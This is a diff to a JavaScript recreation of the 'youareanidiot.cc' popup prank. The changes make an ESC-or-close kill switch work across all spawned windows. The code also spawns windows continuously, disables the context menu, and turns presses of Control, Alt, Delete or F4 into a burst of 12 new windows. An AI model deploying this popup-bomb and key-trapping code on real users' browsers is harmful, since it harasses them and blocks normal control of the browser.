@@ -59,10 +59,15 @@ micon.addEventListener('click', audioSwitch);
 
 // ==========================================================================
 // ENHANCED REPLICATION: exact youareanidiot.cc + continuous spawn + loud audio + kill switch
-// Closing ANY window kills ALL windows.
+// ALL windows share the SAME sessionId so kill signals propagate correctly.
 // ==========================================================================
 
-const sessionId = 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
+const urlParams = new URLSearchParams(window.location.search);
+const urlSession = urlParams.get('session');
+const isPopup = (window.opener !== null || !!urlSession);
+
+// CRITICAL: popups MUST use the sessionId from the URL so all windows share the same killKey.
+const sessionId = urlSession || 'i_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7);
 const killKey = 'ik_' + sessionId;
 
 function isKilled() {
@@ -75,16 +80,13 @@ function clearKill() {
 	try { localStorage.removeItem(killKey); } catch (e) {}
 }
 
-const urlParams = new URLSearchParams(window.location.search);
-const urlSession = urlParams.get('session');
-const isPopup = (window.opener !== null || !!urlSession);
-
+// Main page clears stale kill on load
 if (!isPopup && !urlSession) {
 	clearKill();
 }
 
 // -------------------------------------------------------------------------
-// KILL SWITCH: Closing ANY window or pressing ESC kills EVERYTHING
+// KILL SWITCH: ESC or closing ANY window kills ALL windows instantly
 // -------------------------------------------------------------------------
 let moveTimer = null;
 let spawnTimer = null;
@@ -115,12 +117,12 @@ function doCleanup() {
 	try { window.close(); } catch (e) {}
 }
 
-// Aggressive kill polling
+// Ultra-fast kill polling (20ms = 50 checks/second)
 killPollId = setInterval(() => {
 	if (isKilled()) doCleanup();
-}, 50);
+}, 20);
 
-// ESC kills everything
+// ESC in ANY window kills ALL
 window.addEventListener('keydown', (e) => {
 	if (e.key === 'Escape') {
 		signalKill();
@@ -128,17 +130,11 @@ window.addEventListener('keydown', (e) => {
 	}
 });
 
-// CLOSING ANY WINDOW kills everything: set kill signal before unload
-window.addEventListener('beforeunload', () => {
-	signalKill();
-});
+// Closing ANY window kills ALL
+window.addEventListener('beforeunload', () => { signalKill(); });
+window.addEventListener('pagehide', () => { signalKill(); });
 
-// Also catch pagehide (fires even if beforeunload is skipped)
-window.addEventListener('pagehide', () => {
-	signalKill();
-});
-
-// Immediate kill check for popups that open after the apocalypse
+// If already killed, die immediately
 if (isKilled()) {
 	doCleanup();
 	throw new Error('Killed before start');
@@ -251,14 +247,23 @@ container.addEventListener('click', async () => {
 
 window.onload = playBall;
 window.oncontextmenu = () => false;
-window.onkeydown = async (event) => {
+
+// MERGED keydown handler: preserves ESC kill + original trap keys
+window.addEventListener('keydown', async (event) => {
+	// ESC kills everything
+	if (event.key === 'Escape') {
+		signalKill();
+		doCleanup();
+		return;
+	}
 	if (isKilled()) return;
+
+	// Original trap keys from you.js
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
 		await proCreate(12);
 		alert("You are an idiot!");
 	}
-	return null;
-}
+});
 
 // --- Continuous spawn every 3.5 seconds (main window only) ---
 if (!isPopup && !urlSession) {
